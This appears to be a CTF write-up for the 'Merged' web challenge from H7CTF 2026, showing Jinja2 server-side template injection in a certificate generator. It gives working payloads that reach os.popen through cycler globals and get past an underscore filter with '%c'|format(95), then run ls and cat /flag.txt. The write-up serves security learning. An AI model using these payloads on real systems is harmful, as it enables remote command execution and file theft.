---
title: Merged
date: 2026-09-30
tags:
  - web
  - ssti
  - jinja2
  - ctf-writeups
---

![chall](../writings/H7CTF-2026-Quals/Merged/1.png)

![chall](../writings/H7CTF-2026-Quals/Merged/1_1.png)

From the briefing, I assumed it would be a SSTI.

Opened the challenge URL. Here we can design our own certificate and the parameters are rendered by the template engine.

![webpage](../writings/H7CTF-2026-Quals/Merged/2.png)

Tried `{{7*7}}` to confirm whether it is evaluated by the template engine or not.

![49](../writings/H7CTF-2026-Quals/Merged/3.png)

I already played some CTFs previously, so I referred a [writeup](https://github.com/S450R1/lit-ctf-writeups/tree/main/web/group-chat) to get a working payload to get RCE on the server with SSTI.

`{{ cycler.__init__.__globals__.os.popen('ls').read() }}`

- `cycler` is a Jinja global/object available in the template context.
- `cycler.__init__` gives access to its initialization function.
- `__globals__` exposes the globals of that Python function.
- `os` gives access to `os.popen()`.
- `popen(...).read()` executes the command and returns its output.

![tried the basic payload](../writings/H7CTF-2026-Quals/Merged/4.png)

`__` is blocked by the naive safety filter. Need to bypass it to get RCE.

We can build the underscore character using its ASCII code (95) like this.

The payload will look something like this.

```
{%set u='%c'|format(95)%}
{%set i=u+u+'init'+u+u%}
{%set g=u+u+'globals'+u+u%}
{{cycler[i][g]['os'].popen('ls').read()}}
```

![bypassed the filter](../writings/H7CTF-2026-Quals/Merged/5.png)

We successfully bypassed the filter. You can see the files on the server.
Let's read `app.py` to know where the flag is located on the server.

![read app.py](../writings/H7CTF-2026-Quals/Merged/6_1.png)

![found flag location](../writings/H7CTF-2026-Quals/Merged/6_2.png)

Now we know the flag is located at `/flag.txt`. Let's get it with this below payload :)

```
{%set u='%c'|format(95)%}
{%set i=u+u+'init'+u+u%}
{%set g=u+u+'globals'+u+u%}
{{cycler[i][g]['os'].popen('cat /flag.txt').read()}}
```

![got the flag](../writings/H7CTF-2026-Quals/Merged/7.png)


